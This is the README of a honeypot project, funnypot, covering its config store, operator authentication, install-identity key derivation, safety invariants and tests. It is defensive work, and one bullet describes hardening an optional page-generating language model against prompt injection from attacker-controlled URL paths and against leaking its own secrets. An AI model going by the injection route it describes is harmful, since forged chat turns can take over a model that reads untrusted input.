```json
{ "version": 1, "vulns": { "attack-cmdi-unix": false, "service-telnet": false, "nuclei-reflection": true } }
```

A disabled service does not bind, a disabled attack rule is skipped, and `nuclei-reflection` off drops all
nuclei-derived fakes. See [`docs/EMULATION-CATALOG.md`](docs/EMULATION-CATALOG.md).

## Runtime config store

Every `FUNNYPOT_*` knob has a coded default in `AppConfig`, and the container is configured by setting
those env vars at deploy time. On top of that, a **runtime config store** (SQLite, FP-0242a) lets an
operator override a knob **without a redeploy**. The resolved value of any knob follows a fixed
precedence:

1. **stored override** — a row in the config store (set by the operator), wins if present;
2. **env seed** — the `FUNNYPOT_*` var, if set (what ships today);
3. **coded default** — the literal in `AppConfig`.

The store lives in `storage/config.sqlite` on the persisted volume, beside the hit store. It is
**sparse**: only real overrides get a row — every knob you never touch keeps falling through to
env → default, so an empty store behaves exactly like today. The typed schema (default, bounds/clamps,
group, and whether a change is live or restart-required) is declared once in
`src/App/Config/ConfigRegistry.php`, transcribed from `AppConfig::fromEnv` and kept in sync by a test.
A stored value is coerced and clamped on read by the exact same code path as an env value, so an
out-of-range override is bounded just as an out-of-range env var always was.

```bash
# Materialise the current environment into the store as override rows (one-time, explicit):
php demo/config-seed.php
# Or set/reset a single knob directly (values validated against the registry):
sqlite3 storage/config.sqlite "INSERT INTO config(key,value,updated_at,updated_by)
  VALUES('style','taunt',datetime('now'),'operator')
  ON CONFLICT(key) DO UPDATE SET value=excluded.value;"
```

Seeding is never automatic (the store stays sparse); it is the explicit `demo/config-seed.php` CLI.
Every write bumps a generation counter mirrored into a `config.gen` sentinel file on the same volume;
the php-fpm workers share an APCu snapshot invalidated on write, and the long-lived protocol/drain
listeners re-read the sentinel on their own cadence — so a change to a **live** knob (`style`,
`severity_ceiling`, latency/jitter, the per-request behavioural knobs) is picked up on the next
request with no restart, while a **restart-required** knob (feature toggles and the LLM/download/
retention knobs baked into objects at bootstrap) takes effect on the next process (re)start. Reads are
**fail-safe** — an unreadable store degrades to the env/default baseline and never breaks a request;
writes are **fail-closed** — an invalid value is rejected so the operator sees the error. APCu is
optional (the read path works without it, just with one small SQLite `SELECT` per request); the demo
image installs it (`demo/apcu.ini`).

The store is editable from the CLI above or `sqlite3`, and — since FP-0242b — from the **admin panel**
on the dashboard itself (below).

## Admin panel & operator auth

The operator controls live on the dashboard page itself, behind a real login (FP-0242b — it replaces
the old shared `FUNNYPOT_ADMIN_PASSWORD` + `X-Admin-Token` compare). The panel and every mutating
endpoint appear **only** on the dashboard path (the hidden `FUNNYPOT_DASHBOARD_PATH` in stealth mode,
`FUNNYPOT_APP_PATH` in public mode) — never on the attacker-facing decoy surface. Everything else on
the box routes to the honeypot, so a scanner can never reach the panel or a config write.

**Auth.** An operator logs in with a username + password; the password is stored as an **Argon2id**
hash in `storage/admin.sqlite` (its own DB, separate from the config store). A successful login mints
a server-side session (a `Secure; HttpOnly; SameSite=Strict` cookie scoped to the dashboard path) with
a per-session **CSRF token** that every mutating action must present. Repeated failed logins from an
IP trigger a temporary **lockout** (a correct password is still refused inside the window), and every
attempt is recorded. Auth is **fail-closed**: any doubt denies.

**Creating the first operator.** On first boot, if no operator exists yet and `FUNNYPOT_ADMIN_PASSWORD`
is set, the first user `admin` is seeded from it — then that env value goes **inert** (no standing
shared-secret backdoor). If you never set it (or need to reset the password), create/reset the operator
from the box without a redeploy:

```bash
php demo/admin-user.php admin 'a-strong-password'    # or omit the password to be prompted
```

**Logging in.** Browse to the dashboard path and use the **login** button, or knock directly with
`?admin=login` (a GET that always serves the login form, even when the public view is `none`).

**The config panel.** Once logged in, the **config** button opens the runtime config store: every
registry knob grouped by area, its resolved value and source (stored / env / default), a live-vs-restart
badge, inline edit (validated against the registry bounds, written through the store's audit +
generation bump), a **reset** to fall a knob back to env/default, and the change **audit log**. Secret
knobs are shown as set/unset only — a secret value is never rendered. (An empty value is rejected: to
clear an override use reset, so an empty string can never silently mask a set env var.)

**Public visibility (`dashboard.public_view`).** A knob controls what an **unauthenticated** visitor
who finds the dashboard path sees — `full` (the live feed), `minimal` (header/lead/stats chrome only,
no event table or controls), or `none` (a 404 decoy — nothing). An **authenticated operator always
sees the full view** regardless. The default is **`none`** (the most secure, least-exposed value):
out of the box an unauthenticated visitor on the dashboard path sees nothing, and the operator raises
it to `minimal`/`full` from the panel if wanted. This is **fail-safe by design** — the config store
returns the registry default on a read fault, so the least-exposed value has to be the baseline, and
the enforcement maps any unknown value to `none` too.

> **Fail-safe caveat (do this):** leave `FUNNYPOT_PUBLIC_VIEW` **unset** (or set it to the least-exposed
> level you would ever want). `AppConfig` falls back to the env var if the config store is briefly
> unreadable, so a stored tighter override (`none`) combined with a looser env value
> (`FUNNYPOT_PUBLIC_VIEW=full`) would resolve to the looser env value on a store fault — MORE exposure
> than you configured. With the env unset, a store fault can only ever fall to the safe baseline.

## Install identity

Every install has ONE private, persisted root of identity: a 32-byte **install master**, created once
by CSPRNG (or supplied through a protected file) and stored 0600 in a root-only directory beneath the
data volume (`demo/storage/.funnypot/identity/`). Nothing derives from a fleet literal, a hostname, a
certificate or the clock any more. From the master a closed HKDF-SHA256 surface derives:

- the **visible persona material** (`fpi1_…`) that seeds the company/domain/PHP-version persona the
  HTML pages, the LLM fakes, the shell fleet, SIP directory, MSSQL/SMB/IPMI banners and the core
  template tier all share; and
- **separate private keys** per consumer — core render salt, fake-filesystem key, web-console
  session MAC, Docker registry-token fingerprint, engagement analytics, Redis telemetry, post-exploit
  state — no two domains share an output and there is no derive-by-label API.

`php bin/funnypot identity:prepare` runs as **root, first, before php-fpm or any listener** (the
entrypoint, the deploy preflight and the compose one-shot all call it): it resolves the master,
selects + verifies the TLS pair, writes a secret-free manifest and then the **scoped runtime bundles**
under `/run/funnypot` — root-only `shell.json`/`sip.json`/`redis.json`/`post-exploit-state.json` and a
0640 root:www-data `http.json` holding only what the web tier needs. Each process reads just its own
bundle; none can reach the master, the manifest or another tier's key. Failure is fail-closed: no
socket binds, the web tier serves its plain 404, and the log carries only a stable code. The
entrypoint then unsets every identity input (`FUNNYPOT_INSTALL_SECRET[_FILE]`, both persona
variables, the TLS paths, `FUNNYPOT_FS_SECRET`) so no child inherits them.

`FUNNYPOT_PERSONA_SEED` (legacy: `FUNNYPOT_PERSONA_SECRET`) remains an optional **cosmetic**
override: it replaces the visible persona verbatim (an existing explicit persona keeps its identity)
but never feeds a key. Weak values (short, or `funnypot`/`changeme`/…) only warn. The generated TLS
decoy cert is now persisted with a provenance sidecar (subject/SAN from the persona hostname or
`FUNNYPOT_CN`/`FUNNYPOT_PUBLIC_DNS`), while an explicit `FUNNYPOT_TLS_CERT_FILE`+`_KEY_FILE` pair or
a legacy `/etc/nginx/funnypot.{crt,key}` pair keeps being served byte-identical. `identity:status`
prints readiness, source class and the public identity hash — never a secret. Migration (one-time
persona / fake-filesystem reroll for installs on the old literal default), backup, restore and the
offline rotation procedure are in [`docs/IDENTITY.md`](docs/IDENTITY.md).

## Safety and invariants

funnypot is built so it can only ever mislead an attacker, never help one.

- **Emulate output, never run input.** The fake shell is a lookup table: no `exec`, `proc_open` or
  `eval`, no real filesystem, no outbound socket. `wget` and `curl` return canned text and the URL is
  logged, never fetched.
- **Reflect, never harm.** No decompression bombs (decoy archives are small + bounded, a few KB to ~1 MB), no retaliation, no
  outbound requests. Every response is size-capped, and the one large one — the fleet console's
  backup-download bait under `/__dl/` — is additionally bounded at nginx (concurrent transfers per
  source and in total, starts per minute, bytes per second, FastCGI spool) so it can never hold the
  php-fpm pool, fill the disk or amplify egress; its intel rows are capped per actor per window.
- **Reflect only escaped, never execute.** Attacker input is not reflected, except the deep panel's
  fake-persistence layer, which echoes a submitted note/message/edit back **HTML-escaped** (bounded,
  per-visitor, TTL'd — never executable, no stored XSS). No request body is ever `unserialize()`d, and
  every synthesized header is CRLF and NUL safe.
- **Coherent personas.** One believable host per attacker, deterministically seeded, not an impossible
  "vulnerable to everything" fingerprint a real analyst would spot.
- **The LLM only upgrades a 404.** The optional page-realism model can only turn a plain 404 into a richer
  believable page; any model fault degrades back to that 404, never to a 500 (a 500 is itself a tell). It
  never chooses the HTTP status or content-type. The request path reaches the prompt only as
  delimiter-stripped data (no ChatML turn can be authored from a URL); every generated body is scanned raw
  *and* entity-decoded for self-disclosure and for the deploy's own secret values; each install samples
  with its own persona-derived seed (no fleet-identical bodies); and fresh generation is bounded per hour
  across all sources (`FUNNYPOT_LLM_GENS_PER_HOUR`, default 60) behind the per-IP velocity gate — over
  budget, cached fakes keep serving and new paths get the plain 404.
- **Inert fakes only.** `example.com` hosts, RFC-5737 IPs, obviously-fake keys and hashes. Never a real
  or working secret.
- **One private install identity, scoped per tier.** Persona and keys derive from a persisted CSPRNG
  master through named HKDF domains; each process reads only its own root-written bundle, the master
  never enters argv/env/logs/config export, and a bootstrap fault is a dark box — never a fleet-shared
  fallback persona.

## Use the engine in your own app

If you want the HTTP inversion engine inside an existing app rather than a whole honeypot box, use the
Composer package instead of this repo:

```bash
composer require metrictower/funnypot-core
```

It is inert by default (detect-only, gate closed), with an opt-in respond mode and a Laravel drop-in. See
the [funnypot-core README](https://github.com/metrictower/funnypot-core) for the integration guide.

## Testing

```bash
composer install
composer test          # full suite in parallel across all cores (~50s)
composer test:fast     # parallel, minus the seeded-panel render tests (quickest smoke)
composer test:serial   # single process (deterministic ordering / debugging, ~2min)
```

Requires **PHP 8.2+** (the install-identity store uses native `fsync()`; 8.0/8.1 are end-of-life) with
`ext-posix`, `ext-sodium` and `ext-openssl`. Tests are pure PHPUnit (no DB or container). The parallel runner is
[paratest](https://github.com/paratestphp/paratest); the seeded fake-data generators memoize per
`(seed, domain)` so the panel render tests don't rebuild the same roster on every assertion —
together these take the suite from minutes to under a minute. `vendor/bin/phpunit` still works for
a plain serial run.

The engine has its own test suite in the [`funnypot-core`](https://github.com/metrictower/funnypot-core) repo,
including a golden test that runs real nuclei against a live server.

`tests/App/PanelDecoyAvailabilityTest` drives the real front controller for a representative set of
decoy/panel/attack paths and asserts each serves (non-404) — the build-time twin of the post-deploy
`scripts/canary.sh`, so a wiring regression that dark-404s the whole deception fails here before it ships.

`tests/App/Ops/` pins the deploy rig itself: the port inventory (`demo/ports.json`) against nginx,
the entrypoint, the Dockerfile, `deploy.sh` and compose (`PortDriftTest` — the same check as
`php scripts/check-ports.php`), the `/__dl/` download envelope, log rotation, the production
opcache setting, and the listener respawn backoff (run against the real `entrypoint.sh` with stubs).

## Build-time helpers

The compiled artifacts under `resources/compiled/` are committed, so a normal run needs no build step.
To regenerate them after editing templates:

```bash
bin/funnypot compile-protocols     # templates/protocol -> the TCP emulator table
bin/funnypot compile-catalog       # derive the emulation catalog (app + engine templates)
bin/funnypot vulns:sync            # refresh the on/off toggle list
php scripts/check-ports.php        # port inventory vs nginx/entrypoint/Dockerfile/deploy/compose (--format, --print sg)
```

Service-persona preflight/status (see [`docs/SERVICE-PROFILES.md`](docs/SERVICE-PROFILES.md)):

```bash
bin/funnypot bootstrap:prepare --target=deploy --publish=exact   # identity then service preflight (no network)
bin/funnypot services:prepare  --target=deploy --publish=exact   # service preflight only (--json prints the manifest)
bin/funnypot services:status   --healthcheck                     # exit 0 on a fresh ready/degraded heartbeat, else 1
bin/funnypot services:status   --wait-ready=45                    # poll the heartbeat up to N seconds
```

## Docs

- [`demo/README.md`](demo/README.md): running the standalone honeypot.
- [`docs/EMULATION-CATALOG.md`](docs/EMULATION-CATALOG.md): the configurable capability surface.
- [`docs/ENGAGEMENT-METRICS.md`](docs/ENGAGEMENT-METRICS.md): engagement episodes — schema, identity/privacy rules, caps, benchmark.
- [`docs/IDENTITY.md`](docs/IDENTITY.md): the persisted install identity — master, derived keys, runtime bundles, TLS selection, migration, backup and rotation.
- [`docs/SERVICE-PROFILES.md`](docs/SERVICE-PROFILES.md): operator-configurable service personas — named/manual/all modes, coherent bundles, the desired/published/effective states, the exposure manifest and the closed listener supervisor.
- [`docs/PROTOCOL-HONEYPOT-PLAN.md`](docs/PROTOCOL-HONEYPOT-PLAN.md): the TCP service emulators and SSH server.
- [funnypot-core](https://github.com/metrictower/funnypot-core): the HTTP inversion engine, its spec and its integration guide.

## Licence

MIT. See [LICENSE](LICENSE). The nuclei inversion engine is derived in part from
[projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)
(MIT, © 2025 ProjectDiscovery, Inc.); the upstream notice ships with the
[funnypot-core](https://github.com/metrictower/funnypot-core) engine.
